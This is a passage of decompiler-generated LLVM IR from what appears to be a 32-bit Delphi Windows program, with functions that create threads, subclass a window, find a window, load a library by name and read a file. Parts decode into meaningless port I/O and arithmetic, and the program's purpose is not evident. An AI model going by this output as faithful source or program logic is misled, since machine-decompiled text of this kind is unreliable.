  store i32 %1, i32* %2, align 4, !insn.addr !1752
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1753
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1753
  %7 = add i8 %4, %6, !insn.addr !1753
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1753
  store i8 %7, i8* %8, align 1, !insn.addr !1753
  %9 = load i8, i8* %3, align 4, !insn.addr !1754
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1754
  %12 = trunc i32 %11 to i8, !insn.addr !1754
  %13 = add i8 %9, %12, !insn.addr !1754
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1754
  store i8 %13, i8* %14, align 1, !insn.addr !1754
  %15 = load i32, i32* %eax, align 4, !insn.addr !1755
  ret i32 %15, !insn.addr !1755
}

define i32 @function_406b5a() local_unnamed_addr {
dec_label_pc_406b5a:
  %0 = call i32 @function_406b98(), !insn.addr !1756
  ret i32 %0, !insn.addr !1756
}

define i32 @function_406b96() local_unnamed_addr {
dec_label_pc_406b96:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1757
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1757
  store i8 %2, i8* %3, align 1, !insn.addr !1757
  ret i32 %0, !insn.addr !1757
}

define i32 @function_406b98() local_unnamed_addr {
dec_label_pc_406b98:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_406bfc, label %dec_label_pc_406b9b, !insn.addr !1758

dec_label_pc_406b9b:                              ; preds = %dec_label_pc_406b98
  %5 = icmp eq i1 %4, false, !insn.addr !1759
  br i1 %5, label %dec_label_pc_406c10, label %dec_label_pc_406b9d, !insn.addr !1759

dec_label_pc_406b9d:                              ; preds = %dec_label_pc_406b9b
  ret i32 %2, !insn.addr !1760

dec_label_pc_406bfc:                              ; preds = %dec_label_pc_406b98
  %6 = call i32 @function_4045ac(), !insn.addr !1761
  br label %dec_label_pc_406c10, !insn.addr !1762

dec_label_pc_406c10:                              ; preds = %dec_label_pc_406bfc, %dec_label_pc_406b9b
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1763
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1764
  %9 = add i32 %0, 20, !insn.addr !1765
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1765
  %11 = load i32, i32* %10, align 4, !insn.addr !1765
  %12 = add i32 %0, 16, !insn.addr !1766
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1766
  %14 = load i32, i32* %13, align 4, !insn.addr !1766
  %15 = add i32 %0, 8, !insn.addr !1767
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1767
  %17 = load i32, i32* %16, align 4, !insn.addr !1767
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1768
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1768
  ret i32 %19, !insn.addr !1769
}

define i32 @function_406c48() local_unnamed_addr {
dec_label_pc_406c48:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1770
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1770
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221900 to i32*), i32 -4, i32 %3), !insn.addr !1771
  ret i32 %4, !insn.addr !1772
}

define i32 @function_406c7d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406c7d:
  %merge.reg2mem = alloca i32, !insn.addr !1773
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1773
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1773
  store i8 %3, i8* %4, align 1, !insn.addr !1773
  %5 = add i32 %1, 114, !insn.addr !1774
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1774
  %7 = load i8, i8* %6, align 1, !insn.addr !1774
  %8 = udiv i32 %0, 256, !insn.addr !1774
  %9 = trunc i32 %8 to i8, !insn.addr !1774
  %10 = add i8 %7, %9, !insn.addr !1774
  store i8 %10, i8* %6, align 1, !insn.addr !1774
  %11 = add i8 %2, -32, !insn.addr !1775
  %12 = icmp ult i8 %2, 32, !insn.addr !1775
  %13 = icmp eq i8 %11, 0, !insn.addr !1775
  %14 = zext i8 %11 to i32, !insn.addr !1775
  %15 = and i32 %1, -256, !insn.addr !1775
  %16 = or i32 %15, %14, !insn.addr !1775
  %17 = or i1 %12, %13, !insn.addr !1776
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1776
  br i1 %17, label %dec_label_pc_406c86, label %dec_label_pc_406cf5, !insn.addr !1776

dec_label_pc_406c86:                              ; preds = %dec_label_pc_406c7d
  %18 = add i32 %16, 105, !insn.addr !1777
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1777
  %20 = load i8, i8* %19, align 1, !insn.addr !1777
  %21 = and i8 %20, %9, !insn.addr !1777
  store i8 %21, i8* %19, align 1, !insn.addr !1777
  %22 = trunc i32 %arg3 to i16, !insn.addr !1778
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1778
  %24 = load i8, i8* %23, align 1, !insn.addr !1778
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1778
  %25 = add i32 %arg5, 105, !insn.addr !1779
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1779
  %28 = load i8, i8* %27, align 1, !insn.addr !1779
  %29 = udiv i32 %arg2, 256, !insn.addr !1779
  %30 = trunc i32 %29 to i8, !insn.addr !1779
  %31 = and i8 %28, %30, !insn.addr !1779
  store i8 %31, i8* %27, align 1, !insn.addr !1779
  %32 = mul i32 %arg5, 2, !insn.addr !1780
  %33 = add i32 %arg2, 115, !insn.addr !1780
  %34 = add i32 %33, %32, !insn.addr !1780
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1780
  %36 = load i8, i8* %35, align 1, !insn.addr !1780
  %37 = trunc i32 %arg2 to i8, !insn.addr !1780
  %38 = add i8 %36, %37, !insn.addr !1780
  %39 = icmp eq i8 %38, 0, !insn.addr !1780
  store i8 %38, i8* %35, align 1, !insn.addr !1780
  br i1 %39, label %dec_label_pc_406cd7, label %dec_label_pc_406c95, !insn.addr !1781

dec_label_pc_406c95:                              ; preds = %dec_label_pc_406c86
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1782
  %41 = load i32, i32* %40, align 4, !insn.addr !1782
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1782
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1783
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1783
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1783
  %45 = icmp eq i32* %43, null, !insn.addr !1784
  %46 = icmp eq i1 %45, false, !insn.addr !1785
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1785
  br i1 %46, label %dec_label_pc_406cf5, label %dec_label_pc_406cb9, !insn.addr !1785

dec_label_pc_406cb9:                              ; preds = %dec_label_pc_406c95
  %47 = call i32 @function_406c48(), !insn.addr !1786
  %48 = call i32 @function_4036c8(), !insn.addr !1787
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1788
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1789
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1789
  ret i32 %51, !insn.addr !1790

dec_label_pc_406cd7:                              ; preds = %dec_label_pc_406c86
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1791
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1791
  store i32 %52, i32* %53, align 4, !insn.addr !1791
  %54 = call i32 @__asm_in.50(i16 %22), !insn.addr !1792
  %55 = and i32 %54, 255, !insn.addr !1793
  %56 = add i32 %55, %arg4, !insn.addr !1793
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1793
  %58 = load i8, i8* %57, align 1, !insn.addr !1793
  %59 = zext i8 %58 to i32, !insn.addr !1793
  %60 = and i32 %54, -256, !insn.addr !1793
  %61 = or i32 %60, %59, !insn.addr !1793
  ret i32 %61, !insn.addr !1793

dec_label_pc_406cf5:                              ; preds = %dec_label_pc_406c95, %dec_label_pc_406c7d
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1793
}

define i32 @function_406d9d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406d9d:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1794
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1794
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1794
  %9 = add i8 %6, %8, !insn.addr !1794
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1794
  store i8 %9, i8* %10, align 1, !insn.addr !1794
  %11 = load i32, i32* %eax, align 4, !insn.addr !1795
  %12 = add i32 %11, 114, !insn.addr !1795
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1795
  %14 = load i8, i8* %13, align 1, !insn.addr !1795
  %15 = udiv i32 %2, 256, !insn.addr !1795
  %16 = trunc i32 %15 to i8, !insn.addr !1795
  %17 = add i8 %14, %16, !insn.addr !1795
  store i8 %17, i8* %13, align 1, !insn.addr !1795
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1796
  %20 = add i8 %19, -32, !insn.addr !1796
  %21 = icmp ult i8 %19, 32, !insn.addr !1796
  %22 = icmp eq i8 %20, 0, !insn.addr !1796
  %23 = zext i8 %20 to i32, !insn.addr !1796
  %24 = and i32 %18, -256, !insn.addr !1796
  %25 = or i32 %24, %23, !insn.addr !1796
  store i32 %25, i32* %eax, align 4, !insn.addr !1796
  %26 = or i1 %21, %22, !insn.addr !1797
  br i1 %26, label %dec_label_pc_406da6, label %dec_label_pc_406e15, !insn.addr !1797

dec_label_pc_406da6:                              ; preds = %dec_label_pc_406d9d
  %27 = add i32 %25, 105, !insn.addr !1798
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1798
  %29 = load i8, i8* %28, align 1, !insn.addr !1798
  %30 = and i8 %29, %16, !insn.addr !1798
  store i8 %30, i8* %28, align 1, !insn.addr !1798
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1799
  store i32 %31, i32* %eax, align 4, !insn.addr !1799
  %32 = trunc i32 %arg3 to i16, !insn.addr !1800
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1800
  %34 = load i8, i8* %33, align 1, !insn.addr !1800
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1800
  %35 = add i32 %arg5, 105, !insn.addr !1801
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1801
  %38 = load i8, i8* %37, align 1, !insn.addr !1801
  %39 = udiv i32 %arg2, 256, !insn.addr !1801
  %40 = trunc i32 %39 to i8, !insn.addr !1801
  %41 = and i8 %38, %40, !insn.addr !1801
  store i8 %41, i8* %37, align 1, !insn.addr !1801
  %42 = mul i32 %arg5, 2, !insn.addr !1802
  %43 = add i32 %arg2, 115, !insn.addr !1802
  %44 = add i32 %43, %42, !insn.addr !1802
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1802
  %46 = load i8, i8* %45, align 1, !insn.addr !1802
  %47 = trunc i32 %arg2 to i8, !insn.addr !1802
  %48 = add i8 %46, %47, !insn.addr !1802
  %49 = icmp eq i8 %48, 0, !insn.addr !1802
  store i8 %48, i8* %45, align 1, !insn.addr !1802
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1803
  br i1 %49, label %dec_label_pc_406df7, label %dec_label_pc_406db5, !insn.addr !1803

dec_label_pc_406db5:                              ; preds = %dec_label_pc_406da6
  %50 = icmp slt i8 %48, 0, !insn.addr !1802
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1804
  %52 = load i32, i32* %51, align 4, !insn.addr !1804
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1804
  br i1 %50, label %dec_label_pc_406e2c, label %dec_label_pc_406dba, !insn.addr !1805

dec_label_pc_406dba:                              ; preds = %dec_label_pc_406db5
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1806
  %55 = add i8 %54, -32, !insn.addr !1806
  %56 = icmp ult i8 %54, 32, !insn.addr !1806
  %57 = icmp eq i8 %55, 0, !insn.addr !1806
  %58 = zext i8 %55 to i32, !insn.addr !1806
  %59 = and i32 %53, -256, !insn.addr !1806
  %60 = or i32 %59, %58, !insn.addr !1806
  store i32 %60, i32* %eax, align 4, !insn.addr !1806
  %61 = or i1 %56, %57, !insn.addr !1807
  br i1 %61, label %dec_label_pc_406dbe, label %dec_label_pc_406e2d, !insn.addr !1807

dec_label_pc_406dbe:                              ; preds = %dec_label_pc_406dba
  %62 = add i32 %arg2, 105, !insn.addr !1808
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1808
  %64 = load i8, i8* %63, align 1, !insn.addr !1808
  %65 = udiv i32 %53, 256, !insn.addr !1808
  %66 = trunc i32 %65 to i8, !insn.addr !1808
  %67 = and i8 %64, %66, !insn.addr !1808
  store i8 %67, i8* %63, align 1, !insn.addr !1808
  %68 = add i32 %arg6, 105, !insn.addr !1809
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1809
  %70 = load i8, i8* %69, align 1, !insn.addr !1809
  %71 = and i8 %70, %40, !insn.addr !1809
  store i8 %71, i8* %69, align 1, !insn.addr !1809
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1810
  %74 = load i8, i8* %73, align 1, !insn.addr !1810
  %75 = trunc i32 %72 to i8, !insn.addr !1810
  %76 = add i8 %74, %75, !insn.addr !1810
  store i8 %76, i8* %73, align 1, !insn.addr !1810
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1811
  %79 = load i8, i8* %78, align 1, !insn.addr !1811
  %80 = trunc i32 %77 to i8, !insn.addr !1811
  %81 = add i8 %79, %80, !insn.addr !1811
  store i8 %81, i8* %78, align 1, !insn.addr !1811
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1812
  %83 = load i32, i32* %82, align 4, !insn.addr !1812
  %84 = add i32 %83, %arg6, !insn.addr !1812
  store i32 %84, i32* %82, align 4, !insn.addr !1812
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1813
  %87 = load i8, i8* %86, align 1, !insn.addr !1813
  %88 = trunc i32 %85 to i8, !insn.addr !1813
  %89 = add i8 %87, %88, !insn.addr !1813
  store i8 %89, i8* %86, align 1, !insn.addr !1813
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1814
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1815
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1815
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1815
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1816
  %92 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1817
  %93 = add i32 %92, 1, !insn.addr !1817
  %94 = icmp eq i32 %93, 0, !insn.addr !1817
  store i32 %93, i32* @global_var_4096e0, align 4, !insn.addr !1817
  %95 = icmp eq i1 %94, false, !insn.addr !1818
  br i1 %95, label %dec_label_pc_406def, label %dec_label_pc_406de5, !insn.addr !1818

dec_label_pc_406de5:                              ; preds = %dec_label_pc_406dbe
  %96 = call i32 @"@LStrClr"(), !insn.addr !1819
  br label %dec_label_pc_406def, !insn.addr !1819

dec_label_pc_406def:                              ; preds = %dec_label_pc_406de5, %dec_label_pc_406dbe
  store i32 0, i32* %eax, align 4, !insn.addr !1820
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1821
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1822
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1822
  br label %dec_label_pc_406df7, !insn.addr !1822

dec_label_pc_406df7:                              ; preds = %dec_label_pc_406def, %dec_label_pc_406da6
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1823
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1823
  store i32 4222468, i32* %99, align 4, !insn.addr !1823
  %100 = load i32, i32* %eax, align 4, !insn.addr !1824
  ret i32 %100, !insn.addr !1824

dec_label_pc_406e15:                              ; preds = %dec_label_pc_406d9d
  %101 = mul i32 %4, 2, !insn.addr !1825
  %102 = add i32 %1, 105, !insn.addr !1825
  %103 = add i32 %102, %101, !insn.addr !1825
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1825
  %105 = load i32, i32* %104, align 4, !insn.addr !1825
  %106 = or i32 %105, %3, !insn.addr !1825
  store i32 %106, i32* %104, align 4, !insn.addr !1825
  %107 = add i32 %0, -1, !insn.addr !1826
  %108 = trunc i32 %3 to i16, !insn.addr !1827
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1827
  %110 = load i32, i32* %109, align 4, !insn.addr !1827
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1827
  %111 = load i32, i32* %eax, align 4, !insn.addr !1828
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1828
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1828
  %115 = or i8 %112, %114, !insn.addr !1828
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1828
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1829
  %118 = load i8, i8* %117, align 1, !insn.addr !1829
  %119 = trunc i32 %116 to i8, !insn.addr !1829
  %120 = add i8 %118, %119, !insn.addr !1829
  store i8 %120, i8* %117, align 1, !insn.addr !1829
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1830
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1830
  %124 = load i8, i8* %123, align 1, !insn.addr !1830
  %125 = add i8 %124, %122, !insn.addr !1830
  %126 = zext i8 %125 to i32, !insn.addr !1830
  %127 = and i32 %121, -256, !insn.addr !1830
  %128 = or i32 %127, %126, !insn.addr !1830
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1831
  %130 = load i8, i8* %129, align 1, !insn.addr !1831
  %131 = trunc i32 %3 to i8, !insn.addr !1832
  %132 = add i8 %125, %131, !insn.addr !1831
  %133 = add i8 %132, %130, !insn.addr !1832
  store i8 %133, i8* %129, align 1, !insn.addr !1832
  %134 = add i32 %128, 1, !insn.addr !1833
  store i32 %134, i32* %eax, align 4, !insn.addr !1833
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1834
  %136 = load i8, i8* %135, align 1, !insn.addr !1834
  %137 = trunc i32 %134 to i8, !insn.addr !1834
  %138 = add i8 %136, %137, !insn.addr !1834
  store i8 %138, i8* %135, align 1, !insn.addr !1834
  br label %dec_label_pc_406e2c, !insn.addr !1834

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e15, %dec_label_pc_406db5
  %139 = load i32, i32* %eax, align 4, !insn.addr !1834
  ret i32 %139, !insn.addr !1834

dec_label_pc_406e2d:                              ; preds = %dec_label_pc_406dba
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1835
  %141 = load i8, i8* %140, align 1, !insn.addr !1835
  %142 = add i8 %141, %55, !insn.addr !1835
  store i8 %142, i8* %140, align 1, !insn.addr !1835
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1836
  %145 = load i8, i8* %144, align 1, !insn.addr !1836
  %146 = trunc i32 %arg3 to i8, !insn.addr !1836
  %147 = add i8 %145, %146, !insn.addr !1836
  store i8 %147, i8* %144, align 1, !insn.addr !1836
  %148 = load i32, i32* %eax, align 4, !insn.addr !1837
  %149 = add i32 %148, 1, !insn.addr !1837
  %150 = mul i32 %149, 2, !insn.addr !1838
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1838
  %152 = load i8, i8* %151, align 2, !insn.addr !1838
  %153 = trunc i32 %149 to i8, !insn.addr !1838
  %154 = add i8 %152, %153, !insn.addr !1838
  store i8 %154, i8* %151, align 2, !insn.addr !1838
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1839
  %156 = load i8, i8* %155, align 1, !insn.addr !1839
  %157 = add i8 %156, %153, !insn.addr !1839
  store i8 %157, i8* %155, align 1, !insn.addr !1839
  ret i32 %149, !insn.addr !1840
}

define i32 @function_406e58() local_unnamed_addr {
dec_label_pc_406e58:
  %esp.1.reg2mem = alloca i32, !insn.addr !1841
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1842
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1842
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1842
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1843
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1844
  %3 = call i32 @function_4036c8(), !insn.addr !1845
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1846
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1846
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1846
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1847
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1848
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1849
  br i1 %7, label %dec_label_pc_406ff7, label %dec_label_pc_406ec2, !insn.addr !1849

dec_label_pc_406ec2:                              ; preds = %dec_label_pc_406e58
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1847
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1850
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1850
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1851
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1852
  br i1 %12, label %dec_label_pc_406ff7, label %dec_label_pc_406ede, !insn.addr !1852

dec_label_pc_406ede:                              ; preds = %dec_label_pc_406ec2
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1853
  %14 = call i32 @function_403720(), !insn.addr !1854
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1855
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1855
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1856
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1856
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1857
  %19 = call i32 @function_4046d4(), !insn.addr !1858
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406ff7

dec_label_pc_406ff7:                              ; preds = %dec_label_pc_406ede, %dec_label_pc_406ec2, %dec_label_pc_406e58
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1859
  %21 = load i32, i32* %20, align 4, !insn.addr !1859
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1860
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1861
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1861
  store i32 4223001, i32* %23, align 4, !insn.addr !1861
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1862
  ret i32 %24, !insn.addr !1863
}

define i32 @function_407012() local_unnamed_addr {
dec_label_pc_407012:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1864
  ret i32 %0, !insn.addr !1864
}

define i32 @function_407017() local_unnamed_addr {
dec_label_pc_407017:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1865
}

define i32 @function_407019(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407019:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1866
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1866
  %3 = load i32, i32* %2, align 4, !insn.addr !1866
  ret i32 %3, !insn.addr !1867
}

define i32 @function_407050() local_unnamed_addr {
dec_label_pc_407050:
  %esp.2.reg2mem = alloca i32, !insn.addr !1868
  %esp.1.reg2mem = alloca i32, !insn.addr !1868
  %esi.0.reg2mem = alloca i32, !insn.addr !1868
  %esp.0.reg2mem = alloca i32, !insn.addr !1868
  %ebx.0.reg2mem = alloca i32, !insn.addr !1868
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1869
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1870
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1870
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1870
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1871
  %2 = call i32 @function_403c88(), !insn.addr !1872
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1873
  br i1 %3, label %dec_label_pc_407139, label %dec_label_pc_40707e, !insn.addr !1873

dec_label_pc_40707e:                              ; preds = %dec_label_pc_407050
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1874
  %5 = call i32 @function_4036c8(), !insn.addr !1875
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1876
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1876
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1876
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1877
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1878
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1879
  br i1 %9, label %dec_label_pc_407139, label %dec_label_pc_4070ba, !insn.addr !1879

dec_label_pc_4070ba:                              ; preds = %dec_label_pc_40707e
  %10 = call i32 @"@LStrClr"(), !insn.addr !1880
  %11 = call i32 @function_403c90(), !insn.addr !1881
  %12 = icmp slt i32 %11, 0, !insn.addr !1882
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1883
  br i1 %12, label %dec_label_pc_407104, label %dec_label_pc_4070d2, !insn.addr !1883

dec_label_pc_4070d2:                              ; preds = %dec_label_pc_4070ba
  %13 = add i32 %11, 1, !insn.addr !1884
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1885
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1885
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1885
  br label %dec_label_pc_4070d5, !insn.addr !1885

dec_label_pc_4070d5:                              ; preds = %dec_label_pc_4070d5, %dec_label_pc_4070d2
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1886
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1886
